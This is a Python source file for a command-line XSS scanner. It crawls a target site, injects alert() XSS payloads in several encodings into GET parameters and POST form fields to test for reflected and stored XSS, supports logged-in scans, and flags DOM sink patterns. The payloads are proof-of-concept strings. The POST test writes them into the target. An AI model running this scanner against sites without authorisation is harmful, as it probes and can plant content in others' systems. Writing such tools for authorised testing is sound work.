import requests
from urllib.parse import urlencode, urlparse, urljoin
import argparse
import json
import re
import time
from datetime import datetime
from bs4 import BeautifulSoup
import base64

# Commonly used params and payloads
params_to_test = [
    "q", "query", "search", "s", "id", "page", "lang", "ref", "next", "redirect", "callback",
    "return", "continue", "url", "path", "file", "email", "user", "username", "password", "img_url", "token"
]

payloads = [
    "<script>alert('XSS')</script>",
    "\";alert(1);//",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
]

stored_params = ["comment", "message", "content", "description", "body", "review"]

DOM_SINKS = [
    r"innerHTML",
    r"document\.write",
    r"eval",
    r"location\.hash",
    r"location\.search",
    r"setTimeout",
    r"setInterval",
    r"document\.cookie",
    r"window\.location",
    r"window\.name",
    r"onerror",
    r"onclick",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/99.0",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1",
}

findings = []
session = requests.Session()

def encode_payloads(payloads):
    encoded = []
    for p in payloads:
        encoded.append(p)
        encoded.append(urlencode({"": p})[1:])  # URL-encoded
        encoded.append(base64.b64encode(p.encode()).decode())  # base64 encoded
        encoded.append(p.replace("<", "\\x3C").replace(">", "\\x3E"))  # simple escape
    return list(set(encoded))  # remove duplicates

def perform_login(session, login_url, login_data):
    try:
        # If login_data is a file path ending with .json, load from file
        if login_data.endswith('.json'):
            with open(login_data) as f:
                data = json.load(f)
        else:
            data = json.loads(login_data)
        resp = session.post(login_url, data=data, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            print("[+] Login successful")
            return True
        else:
            print(f"[!] Login failed with status {resp.status_code}")
            return False
    except Exception as e:
        print(f"[!] Login error: {e}")
        return False

def test_reflection(target_url, sid, total, current_idx):
    issues_found = 0
    start_time = time.time()
    print(f"[*] Starting scan [SID:{sid}][{current_idx}/{total}][{(current_idx/total)*100:.2f}%] / URL: {target_url}")
    try:
        resp = session.get(target_url, headers=HEADERS, timeout=10)
        ct = resp.headers.get("Content-Type", "")
        sts = resp.headers.get("Strict-Transport-Security", "N/A")
        xfo = resp.headers.get("X-Frame-Options", "N/A")
        print(f"[I] Content-Type is {ct}")
        print(f"[I] Strict-Transport-Security is {sts}")
        print(f"[I] X-Frame-Options is {xfo}")
    except Exception as e:
        print(f"[!] Initial request failed for {target_url}: {e}")
        return 0

    encoded_payloads = encode_payloads(payloads)

    for param in params_to_test:
        for payload in encoded_payloads:
            query = urlencode({param: payload})
            full_url = f"{target_url}?{query}"
            try:
                resp = session.get(full_url, headers=HEADERS, timeout=10)
                if resp.status_code == 200:
                    if payload in resp.text:
                        print(f"[+] REFLECTION XSS: param={param} payload={payload} -> {full_url}")
                        findings.append({"type": "reflection", "param": param, "payload": payload, "url": full_url})
                        issues_found += 1
                    else:
                        print(f"[-] Not reflected: param={param} payload={payload}")
                else:
                    print(f"[!] HTTP {resp.status_code} for {full_url}")
            except Exception as e:
                print(f"[!] Error on {param} with payload {payload}: {e}")

    duration = time.time() - start_time
    print(f"[*] [duration: {duration:.2f}s][issues: {issues_found}] Finish Scan!")
    print(f"{'*' * 120}")
    return issues_found

def test_dom(target_url):
    dom_issues = 0
    try:
        resp = session.get(target_url, headers=HEADERS, timeout=10)
        for sink in DOM_SINKS:
            if re.search(sink, resp.text):
                print(f"[!] POSSIBLE DOM SINK found: {sink}")
                findings.append({"type": "dom", "sink": sink, "url": target_url})
                dom_issues += 1
    except Exception as e:
        print(f"[!] Error checking DOM sinks on {target_url}: {e}")
    return dom_issues

def test_stored(target_url):
    stored_issues = 0
    encoded_payloads = encode_payloads(payloads)
    for param in stored_params:
        for payload in encoded_payloads:
            try:
                data = {param: payload}
                resp = session.post(target_url, data=data, headers=HEADERS, timeout=10)
                print(f"[~] Sent POST to {target_url} with {param} = {payload}")
                if payload in resp.text:
                    print(f"[+] POSSIBLE STORED XSS on {target_url} via param: {param}")
                    findings.append({"type": "stored", "param": param, "payload": payload, "url": target_url})
                    stored_issues += 1
            except Exception as e:
                print(f"[!] Error testing stored XSS on {param} with payload {payload}: {e}")
    return stored_issues

def extract_form_params(html):
    soup = BeautifulSoup(html, "html.parser")
    params = set()
    for form in soup.find_all("form"):
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if name:
                params.add(name)
    return list(params)

def crawl_links_and_params(base_url):
    print(f"[*] Crawling {base_url} for links and params")
    urls = set()
    params = set()
    try:
        resp = session.get(base_url, headers=HEADERS, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
        for tag in soup.find_all("a", href=True):
            href = tag['href']
            full = urljoin(base_url, href)
            if full.startswith(base_url):
                urls.add(full)
        params.update(extract_form_params(resp.text))
    except Exception as e:
        print(f"[!] Crawling error: {e}")
    return list(urls), list(params)

def get_subdomains(domain):
    print(f"[*] Enumerating subdomains for {domain}...")
    # Placeholder: Implement real subdomain enumeration if needed
    return []

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Scanner Tool by OMANA-droid")
    parser.add_argument("--url", help="Target URL to scan", required=True)
    parser.add_argument("--subdomains", action="store_true", help="Include subdomain enumeration")
    parser.add_argument("--crawl", action="store_true", help="Enable crawling for additional links")
    parser.add_argument("--depth", type=int, default=1, help="Crawl depth (default=1)")
    parser.add_argument("--output", help="Output file to save findings")
    parser.add_argument("--login-url", help="Login URL for authenticated scans")
    parser.add_argument("--login-data", help="JSON string or file path with login POST data")
    args = parser.parse_args()

    if args.login_url and args.login_data:
        if not perform_login(session, args.login_url, args.login_data):
            print("[!] Exiting due to login failure")
            exit(1)

    target_urls = [args.url]

    if args.subdomains:
        parsed = urlparse(args.url)
        root_domain = parsed.netloc.split(":")[0]
        discovered = get_subdomains(root_domain)
        target_urls.extend(discovered)

    if args.crawl:
        seen = set(target_urls)
        to_crawl = list(target_urls)
        for _ in range(args.depth):
            new_links = []
            for url in to_crawl:
                links, found_params = crawl_links_and_params(url)
                for p in found_params:
                    if p not in params_to_test:
                        params_to_test.append(p)
                for link in links:
                    if link not in seen:
                        seen.add(link)
                        new_links.append(link)
            to_crawl = new_links
            target_urls.extend(new_links)

    total_targets = len(target_urls)
    sid = datetime.now().strftime("%Y%m%d%H%M%S")
    total_issues = 0

    for i, url in enumerate(target_urls, 1):
        total_issues += test_reflection(url, sid, total_targets, i)
        total_issues += test_stored(url)
        total_issues += test_dom(url)

    print(f"[*] Total issues found: {total_issues}")
    if args.output and findings:
        with open(args.output, "w") as f:
            json.dump(findings, f, indent=4)
        print(f"[+] Findings saved to {args.output}")
